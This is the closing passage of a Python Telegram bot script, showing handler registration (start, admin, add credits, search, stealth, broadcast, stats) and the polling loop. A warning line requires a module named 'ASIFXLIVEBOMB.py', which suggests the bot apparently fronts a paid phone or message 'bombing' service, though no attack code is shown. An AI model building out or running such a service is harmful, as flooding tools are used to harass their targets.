        print(f"{Fore.YELLOW}⚠️ Make sure ASIFXLIVEBOMB.py exists in the same folder{Style.RESET_ALL}")
    
    print(f"{Fore.CYAN}🚀 Starting bot...{Style.RESET_ALL}")
    
    # Create application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CommandHandler("add", add_credits))
    app.add_handler(CommandHandler("search", search_command))
    app.add_handler(CommandHandler("stealth", stealth_command))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Start bot
    await app.initialize()
    await app.start()
    print(f"{Fore.GREEN}✅ Bot is running!{Style.RESET_ALL}")
    
    # Run polling
    await app.updater.start_polling()
    
    # Keep running
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}🛑 Shutting down...{Style.RESET_ALL}")
        await app.stop()
        await app.shutdown()

def main():
    """Entry point"""
    try:
        asyncio.run(async_main())
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}🛑 Bot stopped{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}❌ Fatal error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()